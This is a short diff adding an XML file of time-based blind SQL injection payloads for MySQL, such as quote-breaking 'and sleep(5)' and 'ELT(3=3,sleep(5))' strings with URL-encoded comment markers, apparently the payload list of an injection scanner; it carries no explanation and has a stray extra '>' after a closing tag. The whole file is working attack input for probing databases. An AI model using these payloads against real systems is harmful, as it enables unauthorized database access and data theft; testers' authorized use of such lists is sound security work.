@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <dbms value="MySQL">
+        <bool payload="' and sleep(5)%23"/>
+        <bool payload='" and sleep(5)%23'/>
+        <bool payload="' or sleep(5)%23"/>
+        <bool payload='" or sleep(5)%23'/>
+        <bool payload="and sleep(5)%23"/>
+        <bool payload="or sleep(5)%23"/>
+        <bool payload='and ELT(3=3,sleep(5))'/>
+    </dbms>>
+</root>
